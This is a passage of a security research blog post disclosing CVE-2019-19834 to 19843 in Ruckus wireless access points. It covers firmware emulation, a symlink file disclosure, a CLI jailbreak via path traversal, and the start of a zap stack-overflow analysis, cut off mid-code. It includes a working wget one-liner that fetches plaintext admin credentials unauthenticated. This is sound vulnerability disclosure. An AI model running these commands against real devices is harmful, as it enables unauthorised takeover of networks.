<!DOCTYPE html>
<html lang="en">
<head>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-92665328-1"></script>
<script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        
        gtag('config', 'UA-92665328-1');
    </script>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<title>Don't Ruck Us Too Hard - Owning Ruckus AP devices</title>
<meta name="name" content="Don't Ruck Us Too Hard - Owning Ruckus AP devices">
<meta name="description" content="Don't Ruck Us Too Hard - Owning Ruckus AP devices">
<meta name="image" content="https://alephsecurity.com/assets/img/logo-black.png">
<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@alephsecurity">
<meta name="twitter:creator" content="@alephsecurity">
<meta name="twitter:title" content="Don't Ruck Us Too Hard - Owning Ruckus AP devices">
<meta name="twitter:url" content="https://alephsecurity.com/2020/01/14/ruckus-wireless/">
<meta name="twitter:description" content="Don't Ruck Us Too Hard - Owning Ruckus AP devices">
<meta name="twitter:image:src" content="https://alephsecurity.com/assets/img/logo-black.png">
<meta property="og:site_name" content="">
<meta property="og:title" content="Don't Ruck Us Too Hard - Owning Ruckus AP devices">
<meta property="og:type" content="article">
<meta property="og:description" content="Don't Ruck Us Too Hard - Owning Ruckus AP devices">
<meta property="og:url" content="https://alephsecurity.com/2020/01/14/ruckus-wireless/">
<meta property="article:published_time" content="2020-01-14T00:00:00+00:00">
<meta property="article:author" content="https://alephsecurity.com">
<meta property="og:image" content="https://alephsecurity.com/assets/img/logo-black.png">
<link rel="icon" href="/favicon.png">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inconsolata:400,700">
<link rel="stylesheet" type="text/css" href="/assets/css/main.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      messageStyle: "none",
      tex2jax: {preview: "none"},
      CommonHTML: { linebreaks: { automatic: true } },
      "HTML-CSS": { linebreaks: { automatic: true } },
      SVG: { linebreaks: { automatic: true } }
    });
    </script>
<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
    </script>
</head>
<body>
<div class="wrapper">
<div class="page__back">
<a href="/">&lt;-- <span class="smallogo">א</span></a>
</div>
<div class="page">
<div class="page__post">
<div class="page__title">
<h1>Don't Ruck Us Too Hard - Owning Ruckus AP devices</h1>
</div>
By <a href="/authors/waveburst">Gal Zror</a> (<a href="https://twitter.com/waveburst">@waveburst</a>)
<br>
<div class="page__date"><span>January 14, 2020</span></div>
* <div class="page__refs"><span>
<br> <div class="cve-moderate"><span class="" title="Ruckus CLI (ruckus_cli2) jailbreak"><a href="/vulns/aleph-2019004">CVE-2019-19834</a></span></div> <div class="cve-moderate"><span class="" title="SSRF vulnerability in zap"><a href="/vulns/aleph-2019005">CVE-2019-19835</a></span></div> <div class="cve-critical"><span class="" title="Remote code execution vulnerability via zap"><a href="/vulns/aleph-2019006">CVE-2019-19836</a></span></div> <div class="cve-high"><span class="" title="Information disclosure vulnerability"><a href="/vulns/aleph-2019007">CVE-2019-19837</a></span></div> <br> <div class="cve-critical"><span class="" title="Remote command injection via a crafted HTTP request (cmdImportAvpPort)"><a href="/vulns/aleph-2019008">CVE-2019-19838</a></span></div> <div class="cve-critical"><span class="" title="Remote command injection via a crafted HTTP request (cmdImportCategory)"><a href="/vulns/aleph-2019009">CVE-2019-19839</a></span></div> <div class="cve-critical"><span class="" title="Stack buffer overflow in zap executable"><a href="/vulns/aleph-2019010">CVE-2019-19840</a></span></div> <div class="cve-critical"><span class="" title="Remote command injection via a crafted HTTP request (cmdPacketCapture)"><a href="/vulns/aleph-2019011">CVE-2019-19841</a></span></div> <br> <div class="cve-critical"><span class="" title="Remote command injection via a crafted HTTP request (cmdSpectraAnalysis)"><a href="/vulns/aleph-2019012">CVE-2019-19842</a></span></div> <div class="cve-critical"><span class="" title="Admin credentials leakage"><a href="/vulns/aleph-2019013">CVE-2019-19843</a></span></div>
</span></div>
<br>
* <div class="page__commentcount"><span><a href="https://alephsecurity.com/2020/01/14/ruckus-wireless/#disqus_thread"></a></span></div>
<div class="page__content" ?>
<h1 id="abstract">Abstract</h1>
<p>Ruckus Networks is a company selling wired and wireless networking equipment and software. This article presents vulnerability research conducted on Ruckus access points. It resulted in 3 different pre-authentication remote code executions. Exploitation uses various vulnerabilities, such as information and credentials leakage, authentication bypass, command injection, path traversal, stack overflow, and arbitrary file read/write. Throughout the research, we examined the firmware of 33 different access points. All were found vulnerable. This article also introduces and shares the framework used in this research. It includes a Ghidra script and a dockerized QEMU full system emulation for an easy, cross-architecture research setup.</p>
<h2 id="this-research-was-presented-and-recorded-in-the-36th-chaos-communication-congress">This research was presented and recorded in the “36th Chaos Communication Congress”</h2>
<div class="movie"><iframe width="560" height="315" src="https://www.youtube.com/embed/bmGtG55Zz1Q?rel=0?ecver=1" frameborder="0" allowfullscreen=""></iframe></div>
<h1 id="introduction">Introduction</h1>
<p>This research began after attending “BlackHat USA 2019”. We noticed that Ruckus Wireless access points provided the conference’s guest WiFi. When we got back, we decided to give those access points a look. This article focuses on the “R510 Unleashed” access point. However, we believe that all of Ruckus’s indoor and outdoor APs that run firmware version 200.7.10.102.64 and below are vulnerable to the following findings. We examined C110, E510, H320, H510, M510, R310, R500, R510 R600, R610, R710, R720, T300, T301n, T310d, T610, T710, and T710s. Some vulnerabilities also affect ZoneDirector 1200 (10.1.1.0.55), as well. We managed to fingerprint some devices using “shodan.io”, and we noticed that there are thousands of devices accessible from the Internet.</p>
<p><img src="/assets/img/ruckus/image23.png" alt="" /></p>
<h1 id="firmware-analysis">Firmware Analysis:</h1>
<p>Typical for embedded device vulnerability research, we started with downloading the latest firmware. We decided to focus on “R510 Unleashed”, that uses an ARMv7 CPU architecture. Ruckus offers regular WiFi access points that rely on a WiFi controller and an “Unleashed” version that does not rely on a controller.</p>
<h2 id="dockerized-qemu">Dockerized QEMU:</h2>
<p>After extracting the firmware, we decided to emulate the firmware’s binaries in QEMU. This research was done entirely with system emulation. We purchase a R510 device only after we discovered all three vulnerabilities.
In this <a href="https://hub.docker.com/u/waveburst">dockerhub</a>, we got pre-built QEMU systems, for the following architectures: armv7, armv6, mips and mipsel. These dockers really help us emulating and setting up different router setups. For this study, we used a docker that wraps an ARMv7 QEMU system that running a Debian kernel. We managed to run most of the user space code using this setup.</p>
<p>All you have to do is to pull and run our docker:</p>
<p><code class="language-plaintext highlighter-rouge">docker run -it -p 5575:5575 waveburst/qemu-system-armhf</code></p>
<p>Our container includes an SSH server, so we can copy the <code class="language-plaintext highlighter-rouge">squashfs</code> directory extracted from the firmware into our QEMU and <code class="language-plaintext highlighter-rouge">chroot</code> from there.</p>
<p><img src="/assets/img/ruckus/image14.png" alt="" /></p>
<p>Done, we got a chrooted device emulation in 5 minutes.</p>
<h2 id="web-server-configuration">Web Server Configuration:</h2>
<p>R510 uses ‘Embedthis-Appweb/3.4.2’ as its web interface server. Its default configuration is found on <code class="language-plaintext highlighter-rouge">/bin/webs.conf</code>. Reviewing the configuration file showed us that the server’s root directory is <code class="language-plaintext highlighter-rouge">/web</code>. We also could see that the server-side logic uses an ejs handler. <code class="language-plaintext highlighter-rouge">ejs</code> is an <a href="https://ejs.co/">embedded JavaScript</a> engine. Moreover, we understood that there are no restrictions on file fetching. That meant we could fetch any file from the <code class="language-plaintext highlighter-rouge">/web</code> directory, regardless of its file extension or type. In other words - no access control. Next, we wanted to investigate the <code class="language-plaintext highlighter-rouge">/web</code> directory and see if there are any interesting files we can retrieve.</p>
<h1 id="first-attack-scenario">First Attack Scenario:</h1>
<p>This attack scenario includes a web interface credential disclosure (<span class="cve-critical" title="Admin credentials leakage"><a href="/vulns/aleph-2019013">CVE-2019-19843</a></span>), and a CLI jailbreak (<span class="cve-moderate" title="Ruckus CLI (ruckus_cli2) jailbreak"><a href="/vulns/aleph-2019004">CVE-2019-19834</a></span>) to obtain a root shell on the access point.</p>
<h2 id="server-web-directory-cve-2019-19837">Server Web Directory: <span class="cve-high" title="Information disclosure vulnerability"><a href="/vulns/aleph-2019007">CVE-2019-19837</a></span></h2>
<p>The <code class="language-plaintext highlighter-rouge">/web</code> directory holds a relatively large number of files and directories. Most of them are standard html/js/css/images files, but there are also plenty of files with <code class="language-plaintext highlighter-rouge">jsp</code> and <code class="language-plaintext highlighter-rouge">mod</code> extensions. For some reason, <code class="language-plaintext highlighter-rouge">jsp</code> is the extension that represents ejs source files, and <code class="language-plaintext highlighter-rouge">mod</code> represents compiled ejs files. We later demonstrate that we don’t necessarily need a <code class="language-plaintext highlighter-rouge">mod</code> file to run ejs functionality. In addition to these files, there are also symbolic links that point to different files and directories. Since there is no access control, those linked files are all fetchable!</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  web <span class="nb">ls</span> <span class="nt">-ld</span> <span class="sb">`</span>find <span class="nb">.</span> <span class="nt">-type</span> l| <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"css</span><span class="se">\|</span><span class="s2">js</span><span class="se">\|</span><span class="s2">jpg</span><span class="se">\|</span><span class="s2">ico</span><span class="se">\|</span><span class="s2">png</span><span class="se">\|</span><span class="s2">gif</span><span class="se">\|</span><span class="s2">mod</span><span class="se">\|</span><span class="s2">jsp"</span><span class="sb">`</span>
lrwxrwxrwx 1 wave wave 27 Apr 15  2019 ./tmp/temp_banner -&gt; /tmp/uploadguestbanner_file
lrwxrwxrwx 1 wave wave 28 Apr 15  2019 ./tmp/temp_bgimage -&gt; /tmp/uploadguestbgimage_file
lrwxrwxrwx 1 wave wave 18 Apr 15  2019 ./tmp/temp_debug -&gt; /tmp/my_debug_file
lrwxrwxrwx 1 wave wave 25 Apr 15  2019 ./tmp/temp_logo -&gt; /tmp/uploadguestlogo_file
lrwxrwxrwx 1 wave wave 19 Apr 15  2019 ./tmp/temp_map -&gt; /tmp/uploadmap_file
lrwxrwxrwx 1 wave wave 26 Apr 15  2019 ./tmp/temp_weblogo -&gt; /tmp/uploadguestlogo_file2
lrwxrwxrwx 1 wave wave 24 Apr 15  2019 ./uploaded -&gt; /etc/airespider/uploaded
lrwxrwxrwx 1 wave wave 21 Apr 15  2019 ./user/upgrade_progress -&gt; /tmp/upgrade_progress
lrwxrwxrwx 1 wave wave  4 Apr 15  2019 ./user/wps_tool_cache -&gt; /tmp
lrwxrwxrwx 1 wave wave 33 Apr 15  2019 ./wpad.dat -&gt; /etc/airespider/uploaded/wpad.dat
</code></pre></div></div>
<h2 id="symbolic-link-to-tmp-cve-2019-19843">Symbolic link to <code class="language-plaintext highlighter-rouge">/tmp</code>: <span class="cve-critical" title="Admin credentials leakage"><a href="/vulns/aleph-2019013">CVE-2019-19843</a></span></h2>
<p>The above command showed us there was a symbolic link from <code class="language-plaintext highlighter-rouge">/web/user/wps_tool_cache</code> to <code class="language-plaintext highlighter-rouge">/tmp</code> directory. Since we ran R510 in a full QEMU system, we noticed there was some system logic stored in the <code class="language-plaintext highlighter-rouge">/tmp</code> directory. In particular, <code class="language-plaintext highlighter-rouge">rpm.log</code> was written as a part of system initialization. When examining this log file, we noticed that every day, <code class="language-plaintext highlighter-rouge">rpmd</code> created a backup file named <code class="language-plaintext highlighter-rouge">/var/run/rpmkey</code> with a new revision number.<img src="/assets/img/ruckus/image12.png" alt="" /></p>
<p>Fortunately, <code class="language-plaintext highlighter-rouge">/var/run</code> was also symbolically linked to <code class="language-plaintext highlighter-rouge">/tmp/</code>, so we could fetch this file as well. <code class="language-plaintext highlighter-rouge">rpmkey</code> contained some binary data. To examine its content, we used the <code class="language-plaintext highlighter-rouge">strings</code> command. <code class="language-plaintext highlighter-rouge">strings</code> output showed us two interesting fields: <code class="language-plaintext highlighter-rouge">all_powerful_login_name</code> and <code class="language-plaintext highlighter-rouge">all_powerful_login_password</code>. These were the device’s admin credentials in plaintext. Conveniently, the rpmkey revision number was stored at /var/run/rpmkey.rev. That helped us write a bash one-liner that retrieves the device’s credentials:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  demo <span class="nv">num</span><span class="o">=</span><span class="si">$(</span>wget <span class="nt">-q</span> <span class="nt">-O</span> - 192.168.0.1/user/wps_tool_cache/var/run/rpmkey.rev<span class="si">)</span><span class="p">;</span><span class="se">\ </span> 
         wget <span class="nt">-q</span> <span class="nt">-O</span> - 192.168.0.1/user/wps_tool_cache/var/run/rpmkey<span class="nv">$num</span>|<span class="se">\</span>
         strings|grep <span class="nt">-A</span> 1 all_powerful_login

all_powerful_login_name
admin
all_powerful_login_password
mooncake
</code></pre></div></div>
<p>Note: Although we did not include the ZoneDirector 1200 WiFi controller in our research, we confirmed that it is vulnerable to file fetching from <code class="language-plaintext highlighter-rouge">/tmp</code> directory as well.</p>
<h2 id="cli-jailbreak-cve-2019-19834">CLI Jailbreak: <span class="cve-moderate" title="Ruckus CLI (ruckus_cli2) jailbreak"><a href="/vulns/aleph-2019004">CVE-2019-19834</a></span></h2>
<p>Since we could fetch admin credentials, popping a <code class="language-plaintext highlighter-rouge">busybox</code> shell would be our next step. The firmware includes a <code class="language-plaintext highlighter-rouge">dropbear</code> executable. With the admin credentials, we could enable it from the web interface, in case it was not already enabled. The <code class="language-plaintext highlighter-rouge">dropbear</code> server uses the same credentials as the web interface. However, it runs an alternative shell binary called <code class="language-plaintext highlighter-rouge">ruckus_cli2</code>. But we couldn’t get it to run any command we would like. Analyzing this binary with Ghidra showed there was a hidden command called <code class="language-plaintext highlighter-rouge">!v54!,</code> that should pop a <code class="language-plaintext highlighter-rouge">busybox</code> shell.</p>
<p><img src="/assets/img/ruckus/image10.png" alt="" /></p>
<p>However, <code class="language-plaintext highlighter-rouge">!v54!</code> command requires the device’s serial number. Since we couldn’t necessarily know this serial number, a different approach was required. <code class="language-plaintext highlighter-rouge">ruckus_cli2</code> supports a limited script environment, that can run some saved shell scripts. The <code class="language-plaintext highlighter-rouge">exec</code> command runs a script by calling <code class="language-plaintext highlighter-rouge">execve</code> system call with a given path. However, the <code class="language-plaintext highlighter-rouge">exec</code> command is vulnerable to path traversal, and can be used to pop a busybox shell:</p>
<p><img src="/assets/img/ruckus/image3.png" alt="" /></p>
<p>That is the first way to own this AP.</p>
<h1 id="web-interface-analyzing">Web Interface Analyzing:</h1>
<h2 id="important-binaries">Important Binaries:</h2>
<p>The next step was to understand the implementation behind the web interface, and look for some bugs. This was the time to use Ghidra for some binary decompilation.</p>
<p>The following binaries oversee the web interface logic:</p>
<ul>
<li>
<p><code class="language-plaintext highlighter-rouge">/bin/webs</code> - an “Embedthis-Appweb” web server, that handles HTTP/S requests and executes handlers according to its configuration. It sends commands through a Unix domain socket to <code class="language-plaintext highlighter-rouge">emfd</code>.</p>
</li>
<li>
<p><code class="language-plaintext highlighter-rouge">/bin/emfd</code> - an executable that contains the web interface logic, it maps functions from <code class="language-plaintext highlighter-rouge">jsa</code> pages to its functions. It implements web interface commands such as backup, network/firewall configuration, retrieval of system information, and more.</p>
</li>
<li>
<p><code class="language-plaintext highlighter-rouge">/usr/lib/libemf.so</code> - This library is used by <code class="language-plaintext highlighter-rouge">emfd</code> for web authentication and sanitation.</p>
</li>
</ul>
<p><img src="/assets/img/ruckus/image28.png" alt="" /></p>
<h2 id="retrieving-functions-names">Retrieving functions names:</h2>
<p>Ruckus left verbose log strings in the binary’s compiled code. The left log strings are for all levels (INFO/WARN/ERROR/DEBUG). They also contain the function name that printed the logline.</p>
<p><img src="/assets/img/ruckus/image22.png" alt="" /></p>
<p>Thanks to the Ghidra scripting environment, we could search for these log strings and extract the associated function names. Then we could rename the default function names with the ones we found.</p>
<p><img src="/assets/img/ruckus/image15.png" alt="" /></p>
<p>In the <code class="language-plaintext highlighter-rouge">emfd</code> case, it decreased the number of “un-named” functions by almost 50%, from 1505 to 874.</p>
<p><img src="/assets/img/ruckus/image16.png" alt="" /></p>
<p>Note: Leaving sensitive information in log files is a common mistake in general, and particularly in embedded devices. With the help of our team member Vera Mens, we rewrote this script. It is now flexible enough to run on different binaries and search for function name patterns. This script may be useful in many projects and can be found on our <a href="https://github.com/alephsecurity/general-research-tools/tree/master/ghidra_scripts">github</a></p>
<h2 id="emfd-function-mapping"><code class="language-plaintext highlighter-rouge">emfd</code> function mapping:</h2>
<p>When <code class="language-plaintext highlighter-rouge">emfd</code> starts, it maps function name strings to function pointers. The web server uses an ejs handler to call functions in <code class="language-plaintext highlighter-rouge">emfd</code>. The <code class="language-plaintext highlighter-rouge">ejs</code> syntax that calls a function is <code class="language-plaintext highlighter-rouge">Delegate()</code> or <code class="language-plaintext highlighter-rouge">DelegateAsyn()</code>. For example, a request to <code class="language-plaintext highlighter-rouge">/admin/_updateGuestImageName.jsp</code> runs an ejs handler (_updateGuestImageName.jsp), that uses <code class="language-plaintext highlighter-rouge">&lt;%Delegate(‘UploadVerify’, session[‘cid’], action);%&gt;</code>, which will make <code class="language-plaintext highlighter-rouge">emfd</code> call a function called <code class="language-plaintext highlighter-rouge">‘UploadVerify’()</code>.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  web <span class="nb">cat</span> ./admin/_updateGuestImageName.jsp 
&lt;%
var action <span class="o">=</span> params[<span class="s1">'action'</span><span class="o">]</span><span class="p">;</span>
Delegate<span class="o">(</span><span class="s1">'UploadVerify'</span>, session[<span class="s1">'cid'</span><span class="o">]</span>, action<span class="o">)</span><span class="p">;</span>
%&gt;
&lt;script&gt;
    var <span class="nb">dd</span> <span class="o">=</span> <span class="s2">"&lt;%=action%&gt;"</span><span class="p">;</span>
    console.log<span class="o">(</span><span class="nb">dd</span><span class="o">)</span><span class="p">;</span>
&lt;/script&gt;
</code></pre></div></div>
<h1 id="web-server-authentication-mechanism">Web Server authentication mechanism:</h1>
<p>The web interface supports 4 permission levels: admin, fmuser, user, and guest. The role of <code class="language-plaintext highlighter-rouge">emfd</code> is to enforce these permissions. A session is created after a successful request to a <code class="language-plaintext highlighter-rouge">jsa</code> page that uses a <code class="language-plaintext highlighter-rouge">Delegate()</code> call for user authentication.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  web <span class="nb">grep</span> <span class="nt">-nr</span> <span class="nt">--include</span> <span class="se">\*</span>login<span class="se">\*</span>.jsp Auth .|grep Delegate
./admin/login.jsp:25:    Delegate<span class="o">(</span><span class="s2">"AuthAdmin"</span>, session[<span class="s1">'cid'</span><span class="o">]</span>, params[<span class="s2">"username"</span><span class="o">]</span>, params[<span class="s2">"password"</span><span class="o">])</span><span class="p">;</span>
./admin/fmlogin.jsp:18:	Delegate<span class="o">(</span><span class="s2">"AuthFM"</span>, params[<span class="s2">"password"</span><span class="o">]</span>, isAdmin,params[<span class="s2">"fm_user"</span><span class="o">])</span><span class="p">;</span>
./user/user_login_web.jsp:47:        Delegate<span class="o">(</span><span class="s2">"AuthUser"</span>, session[<span class="s1">'cid'</span><span class="o">]</span>, params[<span class="s2">"username"</span><span class="o">]</span>, params[<span class="s2">"password"</span><span class="o">]</span>, task, params[<span class="s1">'email'</span><span class="o">]</span>, params[<span class="s1">'user'</span><span class="o">]</span>, params[<span class="s1">'ssid'</span><span class="o">])</span><span class="p">;</span>
./user/user_login_web.jsp:49:        Delegate<span class="o">(</span><span class="s2">"AuthUser"</span>, session[<span class="s1">'cid'</span><span class="o">]</span>, params[<span class="s2">"username"</span><span class="o">]</span>, params[<span class="s2">"password"</span><span class="o">]</span>, task<span class="o">)</span><span class="p">;</span>
./user/user_login.jsp:41:        Delegate<span class="o">(</span><span class="s2">"AuthUser"</span>, session[<span class="s1">'cid'</span><span class="o">]</span>, params[<span class="s2">"username"</span><span class="o">]</span>, params[<span class="s2">"password"</span><span class="o">]</span>, task, params[<span class="s1">'email'</span><span class="o">]</span>, params[<span class="s1">'user'</span><span class="o">]</span>, params[<span class="s1">'ssid'</span><span class="o">])</span><span class="p">;</span>
./user/user_login.jsp:43:        Delegate<span class="o">(</span><span class="s2">"AuthUser"</span>, session[<span class="s1">'cid'</span><span class="o">]</span>, params[<span class="s2">"username"</span><span class="o">]</span>, params[<span class="s2">"password"</span><span class="o">]</span>, task<span class="o">)</span><span class="p">;</span>
./user/guest_login.jsp:13:    Delegate<span class="o">(</span><span class="s2">"AuthGuest"</span>, cookie, params[<span class="s1">'key'</span><span class="o">]</span>, <span class="s1">''</span>, redirecturl<span class="o">)</span><span class="p">;</span>
./user/oauth_login.jsp:18:Delegate<span class="o">(</span><span class="s2">"OAuthGetLogin"</span>, state<span class="o">)</span><span class="p">;</span>
./user/oauth_login2.jsp:4:Delegate<span class="o">(</span><span class="s2">"RedirectToOAuthServer"</span>, oauth_id,redirecturl<span class="o">)</span><span class="p">;</span>
./uam/_login.jsp:76:Delegate<span class="o">(</span><span class="s2">"AuthHotspotUser"</span>, cid, username, password, ip, task<span class="o">)</span><span class="p">;</span>
./selfguestpass/login.jsp:13:    Delegate<span class="o">(</span><span class="s2">"AuthGuest"</span>, cookie, params[<span class="s1">'key'</span><span class="o">]</span>, <span class="s1">''</span>, redirecturl<span class="o">)</span><span class="p">;</span>
</code></pre></div></div>
<h2 id="session-check-mechanism">Session check mechanism:</h2>
<p>If a specific <code class="language-plaintext highlighter-rouge">jsa</code> page requires authentication, it’s the page’s responsibility to verify the session validity. Every <code class="language-plaintext highlighter-rouge">jsa</code> page should use a <code class="language-plaintext highlighter-rouge">Delegate()</code> call with either <code class="language-plaintext highlighter-rouge">SessionCheck</code> or <code class="language-plaintext highlighter-rouge">GuestSessionCheck</code>, to check whether a session is authenticated or considered a guest, accordingly. If no such call is present, then any <code class="language-plaintext highlighter-rouge">Delegate()</code> function called by this <code class="language-plaintext highlighter-rouge">jsa</code> page does not require authentication. In the following exploits, we sought to avoid any authentication or guest access.</p>
<h3 id="grep-unauthenticated-functions">Grep unauthenticated functions:</h3>
<p>We used the <code class="language-plaintext highlighter-rouge">grep</code> command to check which <code class="language-plaintext highlighter-rouge">jsa</code> pages required no authenticated session.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  web <span class="nb">grep</span> <span class="nt">-l</span> Delegate <span class="si">$(</span><span class="nb">grep</span> <span class="nt">-L</span> <span class="nt">-nr</span> <span class="nt">-m1</span> <span class="nt">--include</span> <span class="se">\*</span>.jsp Check .<span class="si">)</span>|wc <span class="nt">-l</span>
67
</code></pre></div></div>
<p>There were 67 <code class="language-plaintext highlighter-rouge">jsa</code> pages that did not perform any sort of session validation. Next, we wanted to check what functions are called by <code class="language-plaintext highlighter-rouge">Delegate()</code>.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  web <span class="nb">grep </span>Delegate <span class="si">$(</span><span class="nb">grep</span> <span class="nt">-L</span> <span class="nt">-nr</span> <span class="nt">-m1</span> <span class="nt">--include</span> <span class="se">\*</span>.jsp Check .<span class="si">)</span>|<span class="se">\ </span>      
 <span class="nb">cut</span> <span class="nt">-f2</span> <span class="nt">-d</span><span class="s2">"("</span>| <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">"</span><span class="se">\)</span><span class="s2">|,"</span> <span class="s1">'{ print $1 }'</span>|sort|uniq


<span class="s2">"AjaxRestrictedCmdStat"</span>
<span class="s1">'AllowClient'</span>
<span class="s1">'AllowClientTmp'</span>
<span class="s2">"AuthExternUser"</span>
<span class="s2">"AuthFM"</span>
<span class="s2">"AuthGuest"</span>
<span class="s2">"AuthHotspotUser"</span>
<span class="s2">"AuthUser"</span>
<span class="s2">"ChangeSponsorEmail"</span>
<span class="s2">"Cluster"</span>
<span class="s2">"Download"</span>
<span class="s2">"DownloadProv"</span>
<span class="s1">'FillPageVars'</span>
<span class="s2">"FillPageVars"</span>
<span class="s2">"GetApprovalList"</span>
<span class="s2">"GetDeviceList"</span>
<span class="s1">'GetLogo'</span>
<span class="s1">'GetSelfServiceTOU'</span>
<span class="s2">"GetSocialDefaultUrl"</span>
<span class="s2">"LogoutAdmin"</span>
<span class="s2">"LogoutHotspotUser"</span>
<span class="s2">"OAuthGetLogin"</span>
<span class="s2">"PassOnborading"</span>
<span class="s2">"QueryApprovalStatus"</span>
<span class="s2">"RecoveryGuestPass"</span>
<span class="s2">"RedirectToOAuthServer"</span>
<span class="s2">"RejectDevice"</span>
<span class="s1">'SmartClientOnly'</span>
<span class="s1">'TOU'</span>
<span class="s2">"UpdateUserContact"</span>
<span class="s1">'UploadVerify'</span>
<span class="s2">"UserRegistration"</span>
<span class="s2">"WechatGetLogin"</span>
</code></pre></div></div>
<p>Determined by its name, <code class="language-plaintext highlighter-rouge">AjaxRestrictedCmdStat()</code> seemed like an excellent function to start reversing. But before we get into it, let us understand how Ajax requests work.</p>
<h1 id="second-attack-scenario">Second Attack Scenario:</h1>
<p>This attack scenario includes a stack buffer overflow in the <code class="language-plaintext highlighter-rouge">zap</code> executable (<span class="cve-critical" title="Admin credentials leakage"><a href="/vulns/aleph-2019013">CVE-2019-19843</a></span>). It is exploitable by sending an unauthenticated HTTP request to the web interface (<span class="cve-critical" title="Remote code execution vulnerability via zap"><a href="/vulns/aleph-2019006">CVE-2019-19836</a></span>).</p>
<h2 id="ajax-request-structure">Ajax request structure:</h2>
<p>Since we ran the device in a QEMU full system emulation, we could intercept Ajax requests sent to the web interface. It helped us understand the XML structure <code class="language-plaintext highlighter-rouge">emfd</code> expects. Let’s look at the <code class="language-plaintext highlighter-rouge">/admin/_cmdstat.jsp</code> request body:</p>
<p><img src="/assets/img/ruckus/image25.png" alt="" /></p>
<p><code class="language-plaintext highlighter-rouge">comp</code> - informs <code class="language-plaintext highlighter-rouge">emfd</code> which adapter to use. Adapters are the <code class="language-plaintext highlighter-rouge">emfd</code> logical blocks. All supported adapters are registered during startup.</p>
<p><code class="language-plaintext highlighter-rouge">action</code> - sets the function to use for a given adapter. Each adapter defines the actions it supports. Actions might require more attributes or child nodes. In our example, <code class="language-plaintext highlighter-rouge">action=docmd</code> requires <code class="language-plaintext highlighter-rouge">xcmd</code>, both as an attribute and as a child note.</p>
<p><code class="language-plaintext highlighter-rouge">updater</code> - contains the adapter name with a timestamp. Its value is not necessary for our exploits.</p>
<h3 id="ajaxrestrictedcmdstat">AjaxRestrictedCmdStat():</h3>
<p>Reversing this function in Ghdira revealed that it expects the attributes <code class="language-plaintext highlighter-rouge">xcmd='wc'</code> and <code class="language-plaintext highlighter-rouge">comp='zapd'</code>. If the request is valid, it is passed to <code class="language-plaintext highlighter-rouge">AjaxCmdStat()</code>. <code class="language-plaintext highlighter-rouge">AjaxCmdStat()</code> handles all of the Ajax logic. It uses <code class="language-plaintext highlighter-rouge">adapter_doCommand()</code> to pass the request to a function called <code class="language-plaintext highlighter-rouge">doCommand()</code>.</p>
<p><img src="/assets/img/ruckus/image19.png" alt="" /></p>
<h3 id="docommand">doCommand():</h3>
<p><code class="language-plaintext highlighter-rouge">doCommand()</code> is a large switch case function, that executes different commands based on the information form the request. The attribute <code class="language-plaintext highlighter-rouge">cmd</code> describes which functionality to run. With <code class="language-plaintext highlighter-rouge">AjaxRestrictedCmdStat()</code>, we could only pass <code class="language-plaintext highlighter-rouge">wc</code> to <code class="language-plaintext highlighter-rouge">doCommand()</code>. The <code class="language-plaintext highlighter-rouge">wc</code> command expects additional attributes - <code class="language-plaintext highlighter-rouge">wcid</code>, <code class="language-plaintext highlighter-rouge">tool</code>, <code class="language-plaintext highlighter-rouge">server</code>, <code class="language-plaintext highlighter-rouge">client</code>, and <code class="language-plaintext highlighter-rouge">zap-type</code>. If it gets all of them, it calls a shell script wrapper to execute a command called <code class="language-plaintext highlighter-rouge">zap</code>. Some attributes must match a specific value to get the command running. However, none of them pass sanitation. Therefore, we could pass any string with <strong>any length</strong> to the <code class="language-plaintext highlighter-rouge">zap</code> command.</p>
<p>Note: <code class="language-plaintext highlighter-rouge">zap</code> is also vulnerable to SSRF since it sends traffic to any IP address given. <span class="cve-moderate" title="SSRF vulnerability in zap"><a href="/vulns/aleph-2019005">CVE-2019-19835</a></span></p>
<h3 id="zap"><code class="language-plaintext highlighter-rouge">zap</code>:</h3>
<p>Luckily, the source code for <code class="language-plaintext highlighter-rouge">zap</code> is available online. In its documentation, it is described as “designed to be a robust network performance test tool”. Examining the code in <code class="language-plaintext highlighter-rouge">zap.c</code> revealed that it contains a stack overflow in its “-D” argument parsing.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="sc">'D'</span><span class="p">:</span>
	<span class="c1">// int len = strlen(debug_line);</span>
	<span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="p">(</span> <span class="kt">int</span> <span class="p">)</span><span class="n">strlen</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">);</span> <span class="n">j</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
